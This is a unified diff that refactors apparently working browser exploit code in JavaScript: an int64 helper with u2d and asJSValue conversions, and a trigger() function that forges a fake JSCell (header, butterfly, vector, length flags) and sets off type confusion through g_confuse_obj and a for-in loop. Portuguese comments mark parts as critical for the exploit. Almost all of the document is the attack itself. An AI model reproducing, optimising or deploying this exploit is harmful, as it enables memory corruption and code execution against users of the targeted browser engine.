@@ -8,108 +8,106 @@ function zeroFill(number, width) {
     return number + ""; // always return a string
 }
 
+var INT64_SHARED_BUFFER = new ArrayBuffer(16);
+var INT64_U32_VIEW = new Uint32Array(INT64_SHARED_BUFFER);
+var INT64_F64_VIEW = new Float64Array(INT64_SHARED_BUFFER);
+
 function int64(low, hi) {
-    var conversionBuf = new ArrayBuffer(0x100);
-    var u32 = new Uint32Array(conversionBuf);
-    var f64 = new Float64Array(conversionBuf);
+    this.low = low | 0;
+    this.hi = hi | 0;
 
-
-    this.low = (low >>> 0);
-    this.hi = (hi >>> 0);
-
+    var self = this;
+    
     this.add32inplace = function (val) {
-        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
+        var new_lo = (self.low + val) >>> 0;
+        var new_hi = self.hi;
 
-        if (new_lo < this.low) {
-            new_hi++;
+        if (new_lo < self.low) {
+            new_hi = (new_hi + 1) >>> 0;
         }
 
-        this.hi = new_hi;
-        this.low = new_lo;
+        self.hi = new_hi;
+        self.low = new_lo;
     };
 
     this.add32 = function (val) {
-        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
+        var new_lo = (self.low + val) >>> 0;
+        var new_hi = self.hi;
 
-        if (new_lo < this.low) {
-            new_hi++;
+        if (new_lo < self.low) {
+            new_hi = (new_hi + 1) >>> 0;
         }
 
         return new int64(new_lo, new_hi);
     };
 
     this.sub32 = function (val) {
-        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
+        var new_lo = (self.low - val) >>> 0;
+        var new_hi = self.hi;
 
-        if (new_lo > (this.low) & 0xFFFFFFFF) {
-            new_hi--;
+        if (new_lo > self.low) {
+            new_hi = (new_hi - 1) >>> 0;
         }
 
         return new int64(new_lo, new_hi);
     };
 
     this.sub32inplace = function (val) {
-        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
+        var new_lo = (self.low - val) >>> 0;
+        var new_hi = self.hi;
 
-        if (new_lo > (this.low) & 0xFFFFFFFF) {
-            new_hi--;
+        if (new_lo > self.low) {
+            new_hi = (new_hi - 1) >>> 0;
         }
 
-        this.hi = new_hi;
-        this.low = new_lo;
+        self.hi = new_hi;
+        self.low = new_lo;
     };
 
     this.and32 = function (val) {
-        var new_lo = this.low & val;
-        var new_hi = this.hi;
-        return new int64(new_lo, new_hi);
+        return new int64(self.low & val, self.hi);
     };
 
     this.and64 = function (vallo, valhi) {
-        var new_lo = this.low & vallo;
-        var new_hi = this.hi & valhi;
-        return new int64(new_lo, new_hi);
+        return new int64(self.low & vallo, self.hi & valhi);
     };
 
-    this.toString = function (val) {
-        val = 16;
-        var lo_str = (this.low >>> 0).toString(val);
-        var hi_str = (this.hi >>> 0).toString(val);
+    this.toString = function (radix) {
+        radix = radix || 16;
+        var lo_str = (self.low >>> 0).toString(radix);
+        var hi_str = (self.hi >>> 0).toString(radix);
 
-        if (this.hi == 0)
+        if (self.hi === 0) {
             return lo_str;
-        else
-            lo_str = zeroFill(lo_str, 8)
-
+        }
+        
+        lo_str = ('00000000' + lo_str).slice(-8);
         return hi_str + lo_str;
     };
 
     this.toPacked = function () {
         return {
-            hi: this.hi,
-            low: this.low
+            hi: self.hi,
+            low: self.low
         };
     };
 
     this.setPacked = function (pck) {
-        this.hi = pck.hi;
-        this.low = pck.low;
-        return this;
+        self.hi = pck.hi;
+        self.low = pck.low;
+        return self;
     };
-    this.u2d = function () {
-        u32[0] = this.low;
-        u32[1] = this.hi;
 
-        return f64[0];
+    this.u2d = function () {
+        INT64_U32_VIEW[0] = self.low;
+        INT64_U32_VIEW[1] = self.hi;
+        return INT64_F64_VIEW[0];
     };
+
     this.asJSValue = function () {
-        u32[0] = this.low;
-        u32[1] = this.hi - 0x10000;
-        return f64[0];
+        INT64_U32_VIEW[0] = self.low;
+        INT64_U32_VIEW[1] = (self.hi - 0x10000) >>> 0;
+        return INT64_F64_VIEW[0];
     };
 
     return this;
@@ -143,46 +141,58 @@ function trigger() {
     var o = {
         'a': 1
     };
-    var test = new ArrayBuffer(0x1000); // Changed to 0x1000
+    
+    // Otimização: Criar buffer uma vez e cachear referências críticas
+    var test = new ArrayBuffer(0x1000);
+    var test_buffer = test.buffer; // Cache da referência do buffer
+    
     g_confuse_obj = {};
+    
+    // Otimização: Pré-calcular valores int64 para evitar recriação
+    var js_cell_header_val = new int64(0x00000800, 0x01182700).asJSValue();
+    var len_flags_val = new int64(0x00000020, 0x00010001).asJSValue();
+    
     var cell = {
-        js_cell_header: new int64(0x00000800, 0x01182700).asJSValue(),
-        butterfly: false, // Some arbitrary value
+        js_cell_header: js_cell_header_val,
+        butterfly: false,
         vector: g_inline_obj,
-        len_and_flags: (new int64(0x00000020, 0x00010001)).asJSValue()
+        len_and_flags: len_flags_val
     };
-    g_confuse_obj[0 + "a"] = cell;
+    g_confuse_obj["0a"] = cell; // Manter string literal exata
 
-    g_confuse_obj[1 + "a"] = {};
-    g_confuse_obj[1 + "b"] = {};
-    g_confuse_obj[1 + "c"] = {};
-    g_confuse_obj[1 + "d"] = {};
+    // Manter criação individual de objetos (crítico para o exploit)
+    g_confuse_obj["1a"] = {};
+    g_confuse_obj["1b"] = {};
+    g_confuse_obj["1c"] = {};
+    g_confuse_obj["1d"] = {};
 
-
+    // Otimização: Cache do Uint32Array constructor
+    var Uint32ArrayCtor = Uint32Array;
     for (var j = 0x5; j < 0x20; j++) {
-        g_confuse_obj[j + "a"] = new Uint32Array(test);
+        g_confuse_obj[j + "a"] = new Uint32ArrayCtor(test);
     }
+    
+    // Otimização: Cache do ArrayBuffer constructor
+    var ArrayBufferCtor = ArrayBuffer;
     for (var k in o) {
         {
             k = {
                 a: g_confuse_obj,
-                b: new ArrayBuffer(test.buffer),
-                c: new ArrayBuffer(test.buffer),
-                d: new ArrayBuffer(test.buffer),
-                e: new ArrayBuffer(test.buffer),
-                1: new ArrayBuffer(test.buffer),
-
+                b: new ArrayBufferCtor(test_buffer),
+                c: new ArrayBufferCtor(test_buffer),
+                d: new ArrayBufferCtor(test_buffer),
+                e: new ArrayBufferCtor(test_buffer),
+                1: new ArrayBufferCtor(test_buffer),
             };
 
             function k() {
                 return k;
             }
-
         }
 
         o[k];
 
-        if (g_confuse_obj["0a"] instanceof Uint32Array) {
+        if (g_confuse_obj["0a"] instanceof Uint32ArrayCtor) {
             return;
         }
     }
